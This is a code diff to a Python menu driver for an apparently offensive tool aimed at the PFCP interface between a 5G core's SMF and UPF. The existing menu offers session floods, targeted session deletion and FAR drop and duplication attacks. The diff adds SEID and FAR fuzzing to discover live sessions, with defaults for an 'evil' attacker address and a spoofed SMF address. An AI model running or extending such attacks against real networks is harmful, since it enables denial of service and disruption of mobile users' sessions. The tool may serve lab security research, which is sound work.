@@ -1,5 +1,5 @@
 from pfcpDosAttack import PFCPDosAttack
-
+from pfcpFuzzer import PFCPFuzzer
 EVIL_ADDR = "10.100.200.66" 
 UPF_ADDR  = "10.100.200.2"
 SPOOFED_SMF_ADDR = "10.100.200.8"
@@ -51,11 +51,16 @@ def main():
     print("---------------------------------------\n")
     
     print("Choose an attack : ")
+    print("\n==== PFCP DoS Attacks ====")
     print("[1]  PFCP Session Establishment Flood")
     print("[2]  PFCP Session Deletion Flood")
     print("[3]  PFCP Session Deletion Targeted")
     print("[4]  PFCP Session Modification FAR Drop")
     print("[5]  PFCP Session Modification FAR Duplication")
+    
+    print("\n==== PFCP Discovery Attacks ====")
+    print("[6]  PFCP SEID Fuzzing")
+    print("[7]  PFCP FAR Fuzzing")
     
     usr_input = input("# ")
     choice = None
@@ -169,6 +174,61 @@ def main():
             session_range=session_range,
             evil_addr=evil_addr,
             upf_addr=upf_addr,
+            src_port=src_port,
+            dest_port=dest_port
+        )
+    if choice == 6:
+        print("PFCP SEID Fuzzing selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Max SEID to fuzz: ")
+        max_seid = int(input("# "))
+        
+        print("Max FAR to discover (in cases where FARs are not incremented): ")
+        max_far_discover = int(input("# "))
+        
+        fuzzer_obj = PFCPFuzzer()
+        fuzzer_obj.set_verbose(True)
+        fuzzer_obj.Start_PFCP_SEID_fuzzing(
+            upf_addr=upf_addr,
+            src_addr=evil_addr,
+            max_seid=max_seid,
+            max_far_discover=max_far_discover,
+            src_port=src_port,
+            dest_port=dest_port
+        )
+    if choice == 7:
+        print("PFCP FAR Fuzzing selected")
+        
+        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
+        evil_addr = input("# ") or EVIL_ADDR
+        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
+        upf_addr = input("# ") or UPF_ADDR
+        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
+        src_port = int(input("# ") or SRC_PORT)
+        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
+        dest_port = int(input("# ") or DEST_PORT)
+        
+        print("Max SEID to fuzz: ")
+        max_seid = int(input("# "))
+        print("Max FAR to discover: ")
+        max_far_discover = int(input("# "))
+        
+        fuzzer_obj = PFCPFuzzer()
+        fuzzer_obj.set_verbose(True)
+        fuzzer_obj.Start_PFCP_FARID_fuzzing(
+            upf_addr=upf_addr,
+            src_addr=evil_addr,
+            max_seid=max_seid,
+            max_far_discover=max_far_discover,
             src_port=src_port,
             dest_port=dest_port
         )
